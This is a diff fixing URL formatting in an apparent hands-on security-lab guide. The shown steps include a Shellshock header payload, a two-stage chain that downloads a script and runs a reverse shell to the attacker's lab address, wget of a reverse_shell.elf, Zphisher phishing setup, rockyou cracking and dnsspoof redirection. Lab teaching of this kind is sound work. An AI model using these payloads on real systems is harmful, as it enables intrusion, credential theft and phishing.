@@ -306,7 +306,7 @@ nano passwords.txt
 # welcome
 
 # Download the rockyou.txt wordlist for the offline attack
-wget [https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)
+wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
 ```
 
 ---
@@ -432,7 +432,7 @@ sudo apt install -y curl
 
 # While the attack is running, attempt to access the web server
 # This request should hang and eventually time out
-curl [http://192.168.10.12](http://192.168.10.12)
+curl http://192.168.10.12
 ```
 
 ---
@@ -481,7 +481,7 @@ cd shellshock_lab
 # Install git and clone the pre-configured project
 sudo apt-get update
 sudo apt-get install -y git
-git clone [https://github.com/stanly363/ARMShellshockDocker](https://github.com/stanly363/ARMShellshockDocker)
+git clone https://github.com/stanly363/ARMShellshockDocker
 cd ARMShellshockDocker
 
 # Build the custom Docker image for the vulnerable service
@@ -507,7 +507,7 @@ sudo nmap -sS -sV -p 8080 192.168.10.12
 
 # Discover web content, specifically looking for CGI scripts
 # Target port 8080 where the service is running
-dirb [http://192.168.10.12:8080](http://192.168.10.12:8080)
+dirb http://192.168.10.12:8080
 ```
 
 ---
@@ -518,7 +518,7 @@ dirb [http://192.168.10.12:8080](http://192.168.10.12:8080)
 # Send a payload that instructs the server to create a file in /tmp
 # A '500 Internal Server Error' is the expected response
 curl -H 'User-Agent: () { :;}; /usr/bin/touch /tmp/pwned' \
-[http://192.168.10.12:8080/cgi-bin/vulnerable.sh](http://192.168.10.12:8080/cgi-bin/vulnerable.sh)
+http://192.168.10.12:8080/cgi-bin/vulnerable.sh
 ```
 
 ---
@@ -546,11 +546,11 @@ echo '/bin/bash -i >& /dev/tcp/192.168.10.11/4444 0>&1' >> shell.sh
 
 # Stage 1: Trigger the vulnerability to make the server download your script
 # **IMPORTANT** Ensure this is all on one line
-curl -H 'User-Agent: () { :;}; /usr/bin/wget [http://192.168.10.11:8000/shell.sh](http://192.168.10.11:8000/shell.sh) -O /tmp/shell.sh' [http://192.168.10.12:8080/cgi-bin/vulnerable.sh](http://192.168.10.12:8080/cgi-bin/vulnerable.sh)
+curl -H 'User-Agent: () { :;}; /usr/bin/wget http://192.168.10.11:8000/shell.sh -O /tmp/shell.sh' http://192.168.10.12:8080/cgi-bin/vulnerable.sh
 
 # Stage 2: Trigger the vulnerability again to execute the downloaded script
 curl -H 'User-Agent: () { :;}; /bin/bash /tmp/shell.sh' \
-[http://192.168.10.12:8080/cgi-bin/vulnerable.sh](http://192.168.10.12:8080/cgi-bin/vulnerable.sh)
+http://192.168.10.12:8080/cgi-bin/vulnerable.sh
 
 # --- Terminal 2: Start a web server to host the payload ---
 # Leave this running in the foreground
@@ -643,7 +643,7 @@ msf6 exploit(multi/handler) > run
 
 ```bash
 # Download the malicious payload from the attacker's web server
-wget [http://192.168.10.11:8000/reverse_shell.elf](http://192.168.10.11:8000/reverse_shell.elf)
+wget http://192.168.10.11:8000/reverse_shell.elf
 
 # Make the downloaded file executable
 chmod +x reverse_shell.elf
@@ -726,7 +726,7 @@ sudo apt-get update
 sudo apt-get install -y git curl php openssh-client swaks nano
 
 # Clone the Zphisher repository
-git clone [https://github.com/htr-tech/zphisher.git](https://github.com/htr-tech/zphisher.git)
+git clone https://github.com/htr-tech/zphisher.git
 
 # Navigate into the Zphisher directory and launch it
 cd zphisher
@@ -931,7 +931,7 @@ sudo apt-get update
 sudo apt-get install -y dsniff
 
 # Create a hosts file to define the redirection rule
-echo "192.168.10.11 [www.example.com](https://www.example.com)" > dns.hosts
+echo "192.168.10.11 www.example.com" > dns.hosts
 
 # Launch dnsspoof to intercept and forge DNS responses
 # Run this in a new terminal
@@ -945,7 +945,7 @@ sudo dnsspoof -i eth0 -f dns.hosts
 sudo systemd-resolve --flush-caches
 
 # Attempt to connect to the target domain
-ping [www.example.com](https://www.example.com)
+ping www.example.com
 # Observe the ping request going to the Attacker's IP (192.168.10.11)
 ```
 
